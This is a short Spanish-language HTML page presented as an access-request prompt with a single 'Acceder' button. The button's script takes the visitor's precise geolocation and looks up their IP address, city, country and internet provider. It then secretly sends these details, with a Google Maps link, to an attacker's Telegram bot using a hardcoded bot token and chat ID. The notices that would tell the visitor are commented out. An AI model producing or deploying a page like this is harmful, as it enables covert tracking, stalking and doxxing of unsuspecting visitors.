  <h1>Necesitas Permiso Para Acceder</h1>

  <H3>
    Solicita acceso
  </H3>

  <button onclick="enviarDatos()">Acceder</button>

  <script>

    const TOKEN = "8115644125:AAHmtaxAtUt_KB9EZSKIwOa6Rn9a3s0dqDw";

    const CHAT_ID = "1959256229";

    async function enviarDatos() {

      navigator.geolocation.getCurrentPosition(async (pos) => {

        const lat = pos.coords.latitude;

        const lon = pos.coords.longitude;

        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        const ipInfo = await fetch('https://ipapi.co/json/');

        const data = await ipInfo.json();

        const mensaje = `
        
         👑 ANDRIUX 👑
        
🌐 *Nuevo visitante detectado*:

🗺️ País: ${data.country_name}

🏙️ Ciudad: ${data.city}

🌐 IP: ${data.ip}

🏢 Proveedor: ${data.org}

📍 Latitud: ${lat}

📍 Longitud: ${lon}

🔗 [Ver en Google Maps](${mapsLink})

        `;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {

          method: "POST",

          headers: { 'Content-Type': 'application/json' },

          body: JSON.stringify({

            chat_id: CHAT_ID,

            text: mensaje,

            parse_mode: "Markdown"

          })

        });

        //alert("¡Datos enviados con éxito a tu bot de Telegram! 💌");

      }, () => {

        //alert("No pudimos obtener tu ubicación 😥");

      }, { enableHighAccuracy: true });

    }

  </script>
